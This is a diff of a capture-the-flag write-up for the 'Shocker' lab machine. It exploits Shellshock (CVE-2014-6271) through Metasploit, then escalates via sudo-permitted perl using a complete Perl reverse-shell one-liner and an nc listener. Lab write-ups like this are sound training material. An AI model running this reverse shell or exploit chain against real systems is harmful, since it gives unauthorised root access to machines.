@@ -67,7 +67,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-Duckduckducking a bit noticed that the machine's name refers to the Shell Shock vulnerability (CVE-2014-6271), which is related to the `/cgi-bin` directory.
+Duckduckgoing a bit I noticed that the machine's name refers to the Shell Shock vulnerability (CVE-2014-6271), which is related to the `/cgi-bin` directory.
 
 Search on Metasploit:
 ```
@@ -101,7 +101,7 @@ After several attempts with [wfuzz](https://github.com/xmendez/wfuzz), this one 
 root@kali:~# wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt  http://10.10.10.56/cgi-bin/FUZZ.sh
 ```
 
-Now we got the script it's possible to exploit the vulnerability. These are the final options set:
+Now we got the script it's possible to exploit the vulnerability. These are the exploit options already set:
 ```
    Name            Current Setting                     Required  Description
    ----            ---------------                     --------  -----------
@@ -131,4 +131,38 @@ msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
 [*] Command Stager progress - 100.46% done (1097/1092 bytes)
 [*] Sending stage (861480 bytes) to 10.10.10.56
 [*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.56:57908) at 2020-05-24 07:35:52 -0400
+```
+
+This is enough to get the user flag:
+```
+whoami
+shelly
+```
+
+From here it's very straightforward. Check sudoers: `sudo -l`
+```
+sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+```
+
+Good news, `shelly` can run perl as root, so a Perl reverse shell will do:
+
+Attacker:
+```
+nc -lvp 4444
+```
+
+Victim:
+```
+perl -e 'use Socket;$i="10.10.14.4";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+And that's it:
+```
+# whoami
+root
 ```
